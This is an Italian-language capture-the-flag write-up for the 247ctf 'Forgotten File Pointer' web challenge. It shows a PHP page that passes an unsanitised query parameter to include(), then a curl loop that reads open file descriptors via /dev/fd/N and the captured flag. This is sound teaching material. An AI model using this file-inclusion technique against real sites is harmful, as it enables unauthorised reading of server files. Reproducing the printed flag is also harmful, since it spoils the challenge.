---
title: "247ctf Forgotten File Pointer"
date: 2025-10-22T21:19:07+02:00
draft: false
---

# Forgotten File Pointer - WEB

- **Platform:** 247ctf
- **Difficoltà:** Moderate (Relativo alla piattaforma)
- **Link:** https://247ctf.com/  

## Descrizione

```text
We have opened the flag, but forgot to read and print it. Can you access it anyway?
```

In questa challenge ci viene fornito un endpoint che mostra il codice della pagina stessa e ci viene chiesto di recuperare la flag che si trova in un file. 

```php

<?php
  $fp = fopen("/tmp/flag.txt", "r");
  if($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['include']) && strlen($_GET['include']) <= 10) {
    include($_GET['include']);
  }
  fclose($fp);
  echo highlight_file(__FILE__, true);
?>

```

Il codice è abbastanza diretto e la vulnerabilità è evidente: viene passato alla funzione `include()` direttamente il query param 'include' senza alcun tipo di sanificazione, dobbiamo solo trovare il modo di sfruttarlo!

## Analisi

Il file flag.txt viene aperto da PHP ma non viene mostrato direttamente. Tuttavia l'if viene valutato prima della chiamata a `fclose($fp);`, quindi quando viene eseguita `include($_GET['include']);` il file è ancora aperto.

La funzione `include()` ha la proprietà che, se le passi un semplice file di testo, ne stampa il contenuto. Basta quindi passare il nome del file che vogliamo leggere ovvero `/tmp/flag.txt` e il gioco è fatto.

Il problema è che l'if controlla la lunghezza del parametro: `include($_GET['include']);` viene eseguito solo se la stringa non supera i 10 caratteri. 

## Soluzione

Per poter accedere ai file aperti dal processo possiamo rifarci a `/dev/fd`. 

`/dev/fd` è una directory virtuale in Linux che contiene i file descriptor del processo in esecuzione.

In pratica, è un modo per accedere agli stream aperti (stdin, stdout, stderr, socket, file, pipe, ecc.) come se fossero normali file nel filesystem. Ogni "file" all'interno della directory rappresenta un file descriptor:

```text
/dev/fd/0 -> stdin  
/dev/fd/1 -> stdout  
/dev/fd/2 -> stderr  
/dev/fd/3, /dev/fd/4, … -> altri file aperti
```

Nel nostro caso dal momento che `/dev/fd/` è di 9 caratteri possiamo accedere direttamente ai file `/dev/fd/X` dove X è compreso tra 0 a 9, quindi i file descriptor di 1 cifra. A questo punto possiamo provarli tutti facilmente:

```bash
for i in {0..10}; do curl https://97f0352ee0639764.247ctf.com?include=/dev/fd/$i -s | grep 247CTF{ && echo $i -s ; done
```

Attraverso un ciclo for andiamo ad eseguire curl e ricerchiamo la stringa `247CTF{`. Dopo qualche secondo, abbiamo la flag!

```bash
maimba@Saturn:~/$ for i in {0..10}; do curl https://97f0352ee0639764.247ctf.com?include=/dev/fd/$i -s | grep 247CTF{ && echo $i -s ; done
247CTF{4be4e08685e2ed433dde9171e887761e}
10 -s
```
